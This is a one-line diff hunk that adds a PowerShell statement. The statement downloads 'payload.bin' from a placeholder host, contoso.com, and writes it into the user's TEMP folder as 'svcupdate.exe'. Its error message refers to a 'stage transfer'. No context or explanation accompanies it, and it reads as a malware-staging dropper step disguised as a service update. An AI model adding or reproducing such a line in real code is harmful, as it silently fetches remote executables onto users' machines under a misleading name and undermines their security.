@@ -1,0 +1,1 @@
+try { $RemoteUrl = 'https://contoso.com:443/payload.bin'; $OutputPath = "$env:TEMP\svcupdate.exe"; (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $OutputPath); $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Stage transfer failed" }
